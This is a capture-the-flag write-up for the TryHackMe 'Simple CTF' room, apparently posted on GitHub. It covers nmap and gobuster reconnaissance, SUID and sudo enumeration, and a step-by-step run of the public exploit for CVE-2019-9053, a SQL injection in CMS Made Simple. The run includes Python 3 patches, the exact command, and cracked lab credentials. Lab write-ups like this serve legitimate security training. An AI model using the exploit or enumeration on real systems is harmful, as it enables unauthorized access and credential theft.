# Simple CTF

## Room Information

- **Platform:** TryHackMe
- **Room:** Simple CTF
- **Difficulty:** Easy
- **Category:** Capture The Flag (CTF)

---

# Objective

The objective of this room was to perform reconnaissance, enumerate services, identify vulnerabilities, gain initial access to the target system, and perform privilege escalation in a controlled Capture The Flag (CTF) environment.

---

# Topics Covered

- Network Scanning
- Service Enumeration
- FTP Enumeration
- Web Enumeration
- Gobuster
- SSH Access
- Privilege Escalation
- Linux Enumeration

---

# Tools Used

- Nmap
- Gobuster
- FTP
- SSH
- Linux Terminal

---

# Commands Practiced

## Nmap Scan

```bash
nmap -sC -sV <TARGET_IP>
```

## Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

## FTP Connection

```bash
ftp <TARGET_IP>
```

## SSH Login

```bash
ssh username@<TARGET_IP>
```

## Linux Enumeration

```bash
whoami

id

sudo -l

find / -perm -4000 2>/dev/null
```

---

# Key Learnings

- Performed reconnaissance using Nmap.
- Enumerated web directories using Gobuster.
- Explored FTP and SSH services.
- Identified potential privilege escalation vectors.
- Applied systematic penetration testing methodology.

---

# Skills Gained

- Network Reconnaissance
- Enumeration
- Linux Fundamentals
- Privilege Escalation
- Web Enumeration
- Basic Penetration Testing

---


## Room Completion

<img width="1847" height="682" alt="simple ctf" src="https://github.com/user-attachments/assets/32524874-5c5e-48da-89ff-c28755d14fd4" />


---

## Screenshots 
------First flag and second flag>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
<img width="1668" height="878" alt="image" src="https://github.com/user-attachments/assets/d5efae81-ea4d-4b66-b03b-30943abdd557" />





















------Third flag>>>>>>>>>>>>>>>>>>>>>>>>>>>
<img width="1668" height="878" alt="image" src="https://github.com/user-attachments/assets/b3740506-79d5-4905-8690-41f28e831bcc" />
<img width="1668" height="878" alt="image" src="https://github.com/user-attachments/assets/247c5803-d806-4cff-ab35-f31590b404ce" />
<img width="1890" height="941" alt="image" src="https://github.com/user-attachments/assets/b7a20af1-6dcf-4d6d-ace5-3d0b8c0c78c8" />

















------------Fourth flag>>>>>>>>>>>>>>>>>>>>>
Steps
TryHackMe Simple CTF — Cracking the CMS Admin Password (CVE-2019-9053)
Summary

Target: CMS Made Simple ≤ 2.2.9, found at /simple on the Simple CTF box. Vulnerability: Unauthenticated SQL Injection → CVE-2019-9053. Goal: extract and crack the admin password hash.

Steps

1. Locate the public exploit script

locate 46635.py

Kali ships exploitdb with known PoCs pre-indexed — this CVE has a public exploit already on disk at /usr/share/exploitdb/exploits/php/webapps/46635.py.

2. Copy it to a working directory

mkdir ~/simplectf
cp /usr/share/exploitdb/exploits/php/webapps/46635.py ~/simplectf/
cd ~/simplectf

3. Confirm the wordlist is ready

ls -lh /usr/share/wordlists/rockyou.txt

The -c (crack) flag needs a wordlist to brute-force the hash against.

4. Patch the script for Python 3 compatibility The exploit was written in 2019 for Python 2. Three fixes make it run cleanly on modern Kali:

2to3 -w 46635.py
sed -i "s/dict = open(wordlist)/dict = open(wordlist, 'r', encoding='latin-1')/" 46635.py
sed -i 's/hashlib.md5(str(salt) + line)/hashlib.md5((str(salt) + line).encode("latin-1"))/' 46635.py
2to3 -w — auto-converts Python 2 syntax (like print "x") to Python 3 syntax.
encoding='latin-1' — lets the script read rockyou.txt cleanly (it contains non-UTF-8 bytes).
.encode("latin-1") — Python 3's hashlib.md5() requires bytes, not a string.

5. Run the exploit

python3 46635.py -u http://<TARGET_IP>/simple -c -w /usr/share/wordlists/rockyou.txt

This exploits the SQLi to extract the username and password hash + salt from the CMS database, then cracks the hash against rockyou.txt.

Result
[+] Username found: mitch
[+] Password cracked: secret
Root cause note

The script targets Python 2, but modern Kali only ships Python 3. The two patches above bridge that gap — print and string/byte handling changed between Python 2 and 3. The SQLi technique itself is unchanged from the original PoC.


<img width="1668" height="878" alt="image" src="https://github.com/user-attachments/assets/f1335166-16ab-4780-b1aa-946d98b77133" />

<img width="1668" height="878" alt="image" src="https://github.com/user-attachments/assets/ebcb6297-7f81-4695-bfbc-ab78746937e4" />






# Lessons Learned

This room reinforced the importance of systematic enumeration before exploitation. It demonstrated how careful reconnaissance, service enumeration, and privilege escalation techniques are combined during a penetration testing engagement while emphasizing ethical and authorized security testing.
